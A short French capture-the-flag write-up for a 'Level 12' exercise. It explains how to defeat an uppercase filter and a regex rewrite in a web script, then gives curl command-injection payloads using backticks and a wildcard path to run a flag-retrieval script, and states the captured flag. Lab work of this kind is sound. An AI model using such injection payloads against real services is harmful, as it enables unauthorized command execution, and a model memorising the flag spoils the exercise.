# Level 12

## Recherche
---

il va falloir bypass les 2 regles de triage, celle qui remplace toute les minuscules par des majuscules, et celle qui va remplacer ce qu'il y a avant par ce qu'il faut (.*@gmail.com va trouver toutes les adresses finissant par @gmail.com) le . representant n'importe quel char, et le * repete l'operation autant de fois que necessaire.


la string dans le @output est entre des crochets d'execution, il faut donc remplacer le $XX part ce que je veux

je cree un fichier GETFLAG pour coder ce script 
#!/bin/bash
/bin/getflag > /tmp/flag

premier test vraiment pas concluant. pour bypass le premier il faut directement tout penser en majuscule, partout dans les ajouts (pas comme apres)
curl -v 192.168.56.101:4646/x=`/tmp/GETFLAG`

mais comme ca 
curl -v localhost:4646/?x=/GETFLAG

le but c'est de faire en sorte qu'il exec notre script

dans la solution ci apres, l'utilisation des quotes permet de limiter et de signifier qu'il s'agit d'un seul element, l'etoile permet quand a elle de faire l'utilisation de wildcard, le programme va chercher partout un quelque chose qui s'appelle GETFLAG, peut importe ou il est

curl -v localhost:4646/?x='`/*/GETFLAG`'

pour finir, un cat tmp/flag nous donnera le sesame

---
## Flag : g1qKMiRpXf53AWhDaU7FEkczr
---
## Sitographie

https://www.quennec.fr/trucs-astuces/syst%C3%A8mes/gnulinux/programmation-shell-sous-gnulinux/les-commandes-filtres/traitement-de-donn%C3%A9es/transformation-de-caract%C3%A8res-tr

https://unix.stackexchange.com/questions/583882/understanding-a-sed-command-sed-s-s-s-g

https://effective-shell.com/part-6-advanced-techniques/understanding-shell-expansion/#pathname-expansion



